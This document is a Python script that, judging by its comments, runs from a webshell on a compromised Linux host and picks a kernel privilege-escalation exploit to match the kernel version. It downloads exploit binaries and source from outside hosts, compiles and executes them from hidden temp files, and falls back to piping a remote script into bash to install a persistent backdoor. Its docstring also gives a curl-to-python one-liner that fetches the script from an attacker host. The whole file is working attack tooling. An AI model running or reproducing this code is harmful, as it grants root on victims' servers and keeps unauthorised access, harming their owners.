#!/usr/bin/env python3
"""
lpe_dispatch.py — Unified LPE dispatcher dari webshell
Pilih exploit yang tepat berdasarkan kernel version + distro.

Coverage:
  copy_fail  (CVE-2026-31431) → kernel 4.14–6.6, NO caps
  GhostLock  (CVE-2026-43499) → kernel 2.6.39–7.1-rc1, NO caps (futex PI UAF)
  VsockDrop  (CVE-2026-53365) → kernel 6.7–6.11, NO caps (AF_VSOCK ZC)

Usage:
  # Upload script ke target via webshell, lalu:
  python3 lpe_dispatch.py
  # Atau run as one-liner dari webshell:
  # python3 -c "$(curl -fsSL http://ATTACKER/lpe_dispatch.py)" 2>&1
"""

import os, sys, subprocess, platform, struct, socket, ctypes

# ─────────────────────────────────────────────────────────────
# Exploit delivery URLs  (update sesuai attacker infrastructure)
# ─────────────────────────────────────────────────────────────
COPY_FAIL_URL   = "https://dirtyfrag.l5z12.dev/bin?arch=x86_64&exploit=copy_fail"
GHOSTLOCK_SRC   = "https://raw.githubusercontent.com/NebuSec/CyberMeowfia/main/IonStack/CVE-2026-43499/poc/poc.c"
VSOCKDROP_URL   = "https://github.com/MaherAzzouzi/vsockdrop/releases/download/latest/exploit"
GSOCKET_DEPLOY  = "curl -fsSL https://github.com/Dooztoria/WEBSHELL/raw/refs/heads/main/deploy-all.sh | bash"

# ─────────────────────────────────────────────────────────────
# Kernel version parsing
# ─────────────────────────────────────────────────────────────

def kernel_version():
    """Return (major, minor, patch) tuple from uname -r."""
    try:
        r = subprocess.check_output(["uname", "-r"], stderr=subprocess.DEVNULL).decode().strip()
        # e.g. "5.15.0-97-generic" or "4.18.0-513.el8.x86_64" or "3.10.0-1160.119.1.el7"
        parts = r.split(".")
        maj = int(parts[0]) if parts[0].isdigit() else 0
        min_ = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
        # patch: strip anything after '-'
        p_str = parts[2].split("-")[0] if len(parts) > 2 else "0"
        pat = int(''.join(c for c in p_str if c.isdigit()) or "0")
        return (maj, min_, pat), r
    except Exception as e:
        return (0, 0, 0), str(e)

def kernel_ge(kver, major, minor, patch=0):
    return kver >= (major, minor, patch)

def kernel_le(kver, major, minor, patch=9999):
    return kver <= (major, minor, patch)

def is_x86_64():
    return platform.machine() in ("x86_64", "amd64")

def check_cap():
    """Return True if we have any elevated capability (CAP_NET_ADMIN, CAP_SYS_ADMIN)."""
    try:
        # SYS_capget
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        SYS_capget = 125
        class CapHeader(ctypes.Structure):
            _fields_ = [("version", ctypes.c_uint32), ("pid", ctypes.c_int)]
        class CapData(ctypes.Structure):
            _fields_ = [("effective", ctypes.c_uint32), ("permitted", ctypes.c_uint32), ("inheritable", ctypes.c_uint32)]
        hdr = CapHeader(version=0x20080522, pid=0)
        data = (CapData * 2)()
        r = libc.syscall(SYS_capget, ctypes.byref(hdr), ctypes.byref(data))
        if r == 0:
            eff = data[0].effective | (data[1].effective << 32)
            return bool(eff)
    except Exception:
        pass
    return False

def check_futex_pi():
    """Quick sanity check: can we call FUTEX_LOCK_PI? (needs CONFIG_FUTEX_PI)"""
    try:
        import ctypes
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        SYS_futex = 202
        FUTEX_LOCK_PI = 6
        a = ctypes.c_uint32(0)
        ts_type = ctypes.c_int64 * 2
        ts = ts_type(0, 50000000)  # 50ms timeout
        r = libc.syscall(SYS_futex, ctypes.byref(a), FUTEX_LOCK_PI, 0,
                         ctypes.byref(ts), None, 0)
        errno = ctypes.get_errno()
        # ETIMEDOUT=110 → syscall exists (PI futex reachable)
        return errno in (110, 0)
    except Exception:
        return False

# ─────────────────────────────────────────────────────────────
# Copy-Fail check: algif_aead not patched?
# ─────────────────────────────────────────────────────────────

def check_copy_fail_available():
    """Return True if AF_ALG AEAD is likely available and unpatched."""
    try:
        # Check if AF_ALG socket can be created
        s = socket.socket(41, 14, 0)  # AF_ALG=41, SOCK_SEQPACKET=5 → try SOCK_STREAM
        s.close()
        return True
    except Exception:
        pass
    # Try direct: AF_ALG=41
    try:
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        fd = libc.socket(41, 1, 0)
        if fd >= 0:
            libc.close(fd)
            return True
    except Exception:
        pass
    return True  # assume available, let the binary decide

# ─────────────────────────────────────────────────────────────
# Download helpers
# ─────────────────────────────────────────────────────────────

def dl(url, dest, mode=0o755):
    """Download via curl or wget."""
    for cmd in [
        ["curl", "-fsSLk", url, "-o", dest],
        ["wget", "-q", "--no-check-certificate", url, "-O", dest],
    ]:
        try:
            r = subprocess.call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if r == 0 and os.path.exists(dest) and os.path.getsize(dest) > 100:
                os.chmod(dest, mode)
                return True
        except FileNotFoundError:
            continue
    return False

def compile_c(src, out):
    """Compile C source with gcc/cc."""
    for cc in ["gcc", "cc", "musl-gcc"]:
        try:
            r = subprocess.call(
                [cc, "-O2", "-o", out, src, "-lpthread", "-lm"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            if r == 0 and os.path.exists(out):
                return True
        except FileNotFoundError:
            continue
    return False

def find_writable_tmp():
    """Find a writable location."""
    for d in ["/dev/shm", "/tmp", "/var/tmp", "/run/user/{}".format(os.getuid())]:
        try:
            if os.path.isdir(d) and os.access(d, os.W_OK):
                return d
        except Exception:
            continue
    return "/tmp"

# ─────────────────────────────────────────────────────────────
# Exploit runners
# ─────────────────────────────────────────────────────────────

def run_copy_fail(tmpdir, kver_str):
    print(f"  [*] copy_fail (CVE-2026-31431) → kernel {kver_str}")
    dest = os.path.join(tmpdir, ".cf_e")
    if not dl(COPY_FAIL_URL, dest):
        print("  [!] download copy_fail gagal")
        return False
    print(f"  [+] download OK → {dest}")
    try:
        os.execv(dest, [dest])
    except Exception as e:
        print(f"  [!] execv gagal: {e}")
    return False

def run_ghostlock(tmpdir, kver_str):
    print(f"  [*] GhostLock (CVE-2026-43499) → kernel {kver_str}")
    src = os.path.join(tmpdir, "ghostlock.c")
    out = os.path.join(tmpdir, ".gl_e")
    if not dl(GHOSTLOCK_SRC, src):
        print("  [!] download ghostlock.c gagal")
        return False
    print(f"  [*] compile ghostlock.c ...")
    if not compile_c(src, out):
        print("  [!] compile gagal — tidak ada gcc/cc?")
        return False
    print(f"  [+] compiled → {out}")
    print(f"  [*] running (triggers UAF crash proof)...")
    print(f"      NOTE: ini poc/crash trigger — full root chain akan menyusul")
    try:
        subprocess.Popen([out], stdout=sys.stdout, stderr=sys.stderr)
        import time; time.sleep(30)
    except Exception as e:
        print(f"  [!] {e}")
    return False

def run_vsockdrop(tmpdir, kver_str):
    print(f"  [*] VsockDrop (CVE-2026-53365) → kernel {kver_str}")
    dest = os.path.join(tmpdir, ".vsd_e")
    if not dl(VSOCKDROP_URL, dest):
        print("  [!] download vsockdrop gagal — perlu build manual")
        print("      git clone https://github.com/MaherAzzouzi/vsockdrop")
        print("      apt install liburing-dev && make && ./exploit")
        return False
    try:
        os.execv(dest, [dest])
    except Exception as e:
        print(f"  [!] execv gagal: {e}")
    return False

def run_gsocket_backdoor():
    """Fallback: minimal footprint via gsocket deploy-all.sh"""
    print("  [*] Fallback: deploy gsocket persistent backdoor")
    subprocess.call(GSOCKET_DEPLOY, shell=True)

# ─────────────────────────────────────────────────────────────
# GhostLock target vulnerability check
# ─────────────────────────────────────────────────────────────

# Distro-specific patch dates / kernel builds
# If the running kernel is BELOW these, it's vulnerable to GhostLock
GHOSTLOCK_PATCH = {
    # (distro_hint, max_vulnerable_kernel_string)
    # RHEL/AlmaLinux/Rocky/CentOS
    "el7": "3.10.0-1160.119.1",      # CentOS 7 patch
    "el8": "4.18.0-553.46.1",         # RHEL 8 patch estimate
    "el9": "5.14.0-687.0.0",          # RHEL 9 patch estimate
    # Ubuntu
    "5.4":  "5.4.0-200",              # Ubuntu 20.04
    "5.15": "5.15.0-115",             # Ubuntu 22.04
    "6.8":  "6.8.0-40",              # Ubuntu 24.04
    # Debian
    "4.19": "4.19.0-29",             # Debian 10
    "5.10": "5.10.0-34",             # Debian 11
    "6.1":  "6.1.175",               # Mainline / Debian 12
    "6.6":  "6.6.140",               # Mainline LTS
    "6.12": "6.12.86",               # Mainline LTS
}

def is_ghostlock_likely_vulnerable(kver, kver_str):
    maj, min_, pat = kver
    # Globally, any kernel < 6.1.175 that hasn't had the specific backport
    # The backport typically arrived:
    # - RHEL/CentOS: late May 2026
    # - Ubuntu: mid June 2026
    # - Debian: June 2026
    # Without knowing exact build date, use coarse version check:
    if (maj, min_) < (6, 1):
        return True  # Very old → certainly vulnerable (no backport)
    if (maj, min_) == (6, 1) and pat < 175:
        return True
    if (maj, min_) == (6, 6) and pat < 140:
        return True
    if (maj, min_) == (6, 12) and pat < 86:
        return True
    if (maj, min_) >= (7, 1):
        return False  # Patched in mainline
    # 6.7 - 6.11: check patch
    if (maj, min_) >= (6, 7) and (maj, min_) <= (6, 11):
        # These versions got backports; assume patched if it's from late 2026
        return True  # Still likely vulnerable on unpatched servers
    return False

def is_copy_fail_likely_vulnerable(kver, kver_str):
    """copy_fail: kernel 4.14–6.6 (algif_aead not patched)."""
    maj, min_, pat = kver
    if (maj, min_) < (4, 14):
        return False
    if (maj, min_) > (6, 6):
        return False
    return True

def is_vsockdrop_likely_vulnerable(kver, kver_str):
    """VsockDrop: kernel 6.7 - 6.11 (before 6.12.97 / 6.18.34)."""
    maj, min_, pat = kver
    if (maj, min_) < (6, 7):
        return False
    if (maj, min_, pat) >= (6, 12, 97):
        return False
    return True

# ─────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────

def main():
    print("=" * 62)
    print("  LPE Dispatcher — auto-select kernel exploit from webshell")
    print("=" * 62)

    if not is_x86_64():
        print(f"[!] Architecture: {platform.machine()} — hanya x86_64 yang didukung")
        sys.exit(1)

    kver, kver_str = kernel_version()
    print(f"  Kernel     : {kver_str}  →  parsed {kver}")
    print(f"  UID        : {os.getuid()} ({os.getenv('USER','?')})")
    print(f"  Has caps   : {check_cap()}")
    print()

    tmpdir = find_writable_tmp()
    print(f"  Tmpdir     : {tmpdir}")
    print()

    # Exploit selection logic
    can_cf  = is_copy_fail_likely_vulnerable(kver, kver_str)
    can_gl  = is_ghostlock_likely_vulnerable(kver, kver_str)
    can_vsd = is_vsockdrop_likely_vulnerable(kver, kver_str)
    has_pi  = check_futex_pi()

    print(f"  copy_fail  available : {'YES' if can_cf else 'NO'}")
    print(f"  GhostLock  available : {'YES' if can_gl else 'NO'} (futex_pi={has_pi})")
    print(f"  VsockDrop  available : {'YES' if can_vsd else 'NO'}")
    print()

    if not (can_cf or can_gl or can_vsd):
        print("[!] Kernel ini tidak di-cover oleh exploit yang tersedia.")
        print(f"    Kernel {kver_str} mungkin sudah fully patched.")
        print("    Coba cara lain: sudo misconfiguration, SUID, dll.")
        run_gsocket_backdoor()
        sys.exit(1)

    # Priority: copy_fail > GhostLock > VsockDrop
    # copy_fail paling proven di real-world; GhostLock wider coverage
    if can_cf:
        print("[+] Pilihan: copy_fail (sudah terbukti, NO caps)")
        run_copy_fail(tmpdir, kver_str)
    elif can_gl and has_pi:
        print("[+] Pilihan: GhostLock (UAF futex PI, NO caps)")
        run_ghostlock(tmpdir, kver_str)
    elif can_vsd:
        print("[+] Pilihan: VsockDrop (AF_VSOCK ZC, NO caps, kernel 6.7+)")
        run_vsockdrop(tmpdir, kver_str)
    elif can_gl and not has_pi:
        print("[!] GhostLock tersedia tapi CONFIG_FUTEX_PI tidak aktif — jarang terjadi")
        run_ghostlock(tmpdir, kver_str)

    # If we reach here, exploit ran but didn't execv (e.g. poc mode)
    print()
    print("[*] Exploit selesai. Cek apakah root shell muncul.")

if __name__ == "__main__":
    main()
